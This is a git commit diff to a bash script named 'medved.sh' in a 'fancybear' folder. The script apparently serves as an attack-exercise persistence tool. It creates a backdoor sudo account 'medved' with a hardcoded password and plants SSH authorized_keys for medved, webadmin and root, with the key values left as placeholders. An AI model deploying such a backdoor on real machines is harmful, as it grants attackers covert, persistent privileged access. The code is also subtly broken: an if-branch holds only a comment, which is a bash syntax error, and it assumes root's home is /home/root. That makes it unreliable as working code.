76812ad846c16aee2f91061f25c1a691003b9a90
AndersFelde <anderskfelde@hotmail.com>
2023-12-06 19:56:42 +0100

    ait g

--- fancybear/scripts/medved.sh
+++ fancybear/scripts/medved.sh
@@ -1,5 +1,14 @@
 #!/bin/bash
-#создать пользователя sudo
-useradd -m -s /bin/bash -G sudo -p $(openssl passwd -1 'Bolshoymedved') medved
+if id -u "medved" >/dev/null 2>&1; then
+    #echo "user exists"
+else
+    #создать пользователя sudo
+    useradd -m -s /bin/bash -G sudo -p $(openssl passwd -1 'Bolshoymedved') medved
+fi
+
 mkdir -p /home/medved/.ssh
 echo "INSERT KEY HERE" > /home/medved/.ssh/authorized_keys
+mkdir -p /home/webadmin/.ssh
+echo "INSERT KEY HERE" > /home/webadmin/.ssh/authorized_keys
+mkdir -p /home/root/.ssh
+echo "INSERT KEY HERE" > /home/root/.ssh/authorized_keys
